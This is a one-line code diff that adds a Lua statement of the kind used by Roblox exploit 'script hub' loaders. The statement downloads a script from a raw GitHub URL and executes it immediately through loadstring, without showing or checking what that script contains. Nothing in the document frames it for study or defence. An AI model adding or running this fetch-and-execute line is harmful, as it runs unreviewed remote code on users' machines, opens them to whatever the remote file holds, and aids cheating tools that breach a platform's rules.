@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/scripts4roblox/script/main/hub'),true))()
